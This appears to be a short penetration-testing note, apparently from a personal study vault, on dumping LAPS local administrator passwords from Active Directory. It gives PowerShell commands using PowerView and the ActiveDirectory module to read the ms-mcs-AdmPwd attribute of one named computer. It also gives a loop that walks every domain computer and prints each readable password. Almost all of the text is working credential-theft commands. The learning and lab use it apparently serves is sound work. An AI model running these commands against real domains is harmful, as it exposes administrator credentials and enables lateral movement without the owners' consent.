#### Using PowerView to Dump the LAPS Password
```powershell
Import-Module .\PowerView.ps1
Get-DomainObject -Identity LAPS09 -Properties "ms-mcs-AdmPwd",name
```
![[Pasted image 20251229185340.png]]

#### Using ActiveDirectory to Dump the LAPS Password
```powershell
Import-Module ActiveDirectory
Get-ADComputer -Identity LAPS09 -Properties "ms-mcs-AdmPwd",name
```
![[Pasted image 20251229185432.png]]
#### 🛑 Collect all LAPS-enabled Computers with `PowerView`  
```powershell
Import-Module .\PowerView.ps1
Get-DomainComputer -Properties name | ForEach-Object {
    $computer = $_.name
    $obj = Get-DomainObject -Identity $computer -Properties "ms-mcs-AdmPwd",name -ErrorAction SilentlyContinue
    if($obj.'ms-mcs-AdmPwd'){
        Write-Output "$computer`: $($obj.'ms-mcs-AdmPwd')"
    }
}
```
![[Pasted image 20251229185717.png]]
